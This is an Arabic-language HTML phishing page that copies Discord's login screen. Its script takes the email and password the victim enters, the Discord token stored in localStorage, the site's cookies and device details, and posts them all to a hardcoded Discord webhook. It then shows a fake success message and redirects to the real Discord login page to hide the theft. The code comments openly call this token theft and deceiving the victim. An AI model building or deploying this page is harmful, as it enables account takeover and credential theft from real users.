<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - Discord</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #313338;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            padding: 20px;
        }
        .login-box {
            background: #1e1f22;
            padding: 40px 30px;
            border-radius: 10px;
            width: 100%;
            max-width: 420px;
            text-align: center;
            box-shadow: 0 10px 40px rgba(0,0,0,0.4);
        }
        .login-box img {
            width: 80px;
            margin-bottom: 20px;
        }
        .login-box h2 {
            color: #fff;
            font-size: 24px;
            margin-bottom: 8px;
            font-weight: 600;
        }
        .login-box .subtitle {
            color: #b5bac1;
            font-size: 14px;
            margin-bottom: 25px;
        }
        .login-box input {
            width: 100%;
            padding: 12px 16px;
            margin: 8px 0;
            border: 1px solid #3f4147;
            border-radius: 5px;
            font-size: 15px;
            outline: none;
            background: #2b2d31;
            color: #fff;
            transition: 0.3s;
        }
        .login-box input:focus {
            border-color: #5865f2;
            box-shadow: 0 0 0 2px rgba(88, 101, 242, 0.3);
        }
        .login-box button {
            width: 100%;
            padding: 14px;
            background: #5865f2;
            border: none;
            border-radius: 5px;
            color: #fff;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
            transition: 0.3s;
        }
        .login-box button:hover {
            background: #4752c4;
        }
        .login-box .footer {
            margin-top: 20px;
            color: #b5bac1;
            font-size: 13px;
        }
        .login-box .footer a {
            color: #00a8fc;
            text-decoration: none;
        }
    </style>
</head>
<body>

<div class="login-box">
    <img src="https://cdn.discordapp.com/embed/avatars/0.png" alt="Discord">
    <h2>مرحبًا بعودتك!</h2>
    <p class="subtitle">يسعدنا رؤيتك مجددًا!</p>
    <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
    <input type="password" id="password" placeholder="كلمة المرور">
    <button onclick="sendData()">تسجيل الدخول</button>
    <div class="footer">
        بحاجة إلى حساب؟ <a href="#">إنشاء حساب</a>
    </div>
</div>

<script>
    // ===== رابط Webhook =====
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1547681527926882324/ThRzWfgulxAlvMzLT2OZoN5YynnbdufQfzV9QZ-cyrShAWyzUf5KcbkfhWsqpXO7fhD0';

    function sendData() {
        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value.trim();

        if (!email || !password) {
            alert('الرجاء إدخال جميع البيانات');
            return;
        }

        // ===== سرقة التوكن من localStorage =====
        let token = null;
        try {
            token = localStorage.getItem('token');
            if (token) token = token.replace(/"/g, '');
        } catch(e) {}

        // ===== معلومات إضافية =====
        const cookies = document.cookie;
        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        const screenSize = `${screen.width}x${screen.height}`;
        const language = navigator.language;

        // ===== بناء الرسالة =====
        const message = `**📱 اختراق ديسكورد**\n\n` +
            `📧 **البريد:** ${email}\n` +
            `🔑 **كلمة المرور:** ${password}\n` +
            `🔐 **التوكن:** ${token || 'لا يوجد'}\n\n` +
            `━━━━━━━━━━━━━━━━━━━\n` +
            `🍪 **الكوكيز:** ${cookies || 'لا يوجد'}\n` +
            `📱 **الجهاز:** ${platform}\n` +
            `🖥️ **الشاشة:** ${screenSize}\n` +
            `🌐 **اللغة:** ${language}\n` +
            `📋 **المتصفح:** ${userAgent}`;

        // ===== إرسال إلى Webhook =====
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                content: message,
                username: 'Discord Hacker'
            })
        }).catch(() => {});

        // ===== تضليل الضحية =====
        alert('تم تسجيل الدخول بنجاح!');
        window.location.href = 'https://discord.com/login';
    }

    // دعم Enter
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') sendData();
    });
</script>

</body>
</html>
